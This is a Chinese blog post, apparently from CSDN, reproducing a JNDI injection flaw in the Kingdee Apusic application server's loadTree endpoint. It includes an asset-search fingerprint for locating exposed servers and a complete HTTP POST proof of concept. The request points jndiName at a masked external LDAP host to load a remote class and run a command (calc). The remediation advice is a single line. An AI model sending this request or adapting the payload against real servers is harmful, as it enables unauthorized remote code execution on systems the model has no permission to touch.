---
layout: post
title: "金蝶Apusic应用服务器-loadTree-JNDI注入漏洞"
date: 2024-01-05 09:25:22 +0800
description: "金蝶Apusic是一款企业级应用服务器，支持Java EE技术，适用于各种商业环境。由于金蝶Apus"
keywords: "金蝶天燕漏洞"
categories: ['漏洞复现']
tags: ['服务器', '安全', 'Web']
artid: "135401070"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=135401070
    alt: "金蝶Apusic应用服务器-loadTree-JNDI注入漏洞"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=135401070
featuredImagePreview: https://bing.ee123.net/img/rand?artid=135401070
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     金蝶Apusic应用服务器 loadTree JNDI注入漏洞
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-tomorrow-night-eighties" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <h4>
     <a id="_0">
     </a>
     产品介绍
    </h4>
    <p>
     金蝶Apusic是一款企业级应用服务器，支持Java EE技术，适用于各种商业环境。
    </p>
    <h4>
     <a id="_2">
     </a>
     漏洞概述
    </h4>
    <p>
     由于金蝶Apusic应用服务器权限验证不当，使用较低JDK版本，导致攻击者可以向loadTree接口执行JNDI注入，远程加载恶意类，造成远程代码执行。
    </p>
    <h4>
     <a id="_5">
     </a>
     资产测绘
    </h4>
    <p>
     app.name=“Apusic 金蝶天燕 Server”
    </p>
    <h4>
     <a id="_8">
     </a>
     漏洞复现
    </h4>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/8cd7868f45e793b3909e454a1711eaf8.png">
      <br/>
      测试POC:
     </img>
    </p>
    <pre><code class="prism language-lua">POST <span class="token operator">/</span>appmonitor<span class="token operator">/</span>protect<span class="token operator">/</span>jndi<span class="token operator">/</span>loadTree HTTP<span class="token operator">/</span><span class="token number">1.1</span>
Host<span class="token punctuation">:</span> your_ip
Cache<span class="token operator">-</span>Control<span class="token punctuation">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span>
Upgrade<span class="token operator">-</span>Insecure<span class="token operator">-</span>Requests<span class="token punctuation">:</span> <span class="token number">1</span>
User<span class="token operator">-</span>Agent<span class="token punctuation">:</span> Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows NT <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">120.0</span><span class="token number">.0</span><span class="token number">.0</span> Safari<span class="token operator">/</span><span class="token number">537.36</span>
Accept<span class="token punctuation">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.8</span><span class="token punctuation">,</span>application<span class="token operator">/</span>signed<span class="token operator">-</span>exchange<span class="token punctuation">;</span>v<span class="token operator">=</span>b3<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.7</span>
Accept<span class="token operator">-</span>Encoding<span class="token punctuation">:</span> gzip<span class="token punctuation">,</span> deflate<span class="token punctuation">,</span> br
Accept<span class="token operator">-</span>Language<span class="token punctuation">:</span> zh<span class="token operator">-</span>CN<span class="token punctuation">,</span>zh<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span>
Connection<span class="token punctuation">:</span> close
Content<span class="token operator">-</span>Type<span class="token punctuation">:</span> application<span class="token operator">/</span>x<span class="token operator">-</span>www<span class="token operator">-</span>form<span class="token operator">-</span>urlencoded
Content<span class="token operator">-</span>Length<span class="token punctuation">:</span> <span class="token number">55</span>

jndiName<span class="token operator">=</span>ldap<span class="token punctuation">:</span><span class="token operator">//</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">*</span><span class="token operator">/</span>Basic<span class="token operator">/</span>Command<span class="token operator">/</span>calc
</code></pre>
    <p>
     弹出计算器进行验证
     <br/>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/a390b5c6a970acb709fc1ad4d871331d.png"/>
    </p>
    <h4>
     <a id="_28">
     </a>
     修复建议
    </h4>
    <p>
     官方已发布漏洞补丁，请联系软件厂商进行修复。
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f71715f33363631383931382f:61727469636c652f64657461696c732f313335343031303730" class_="artid" style="display:none">
 </p>
</div>


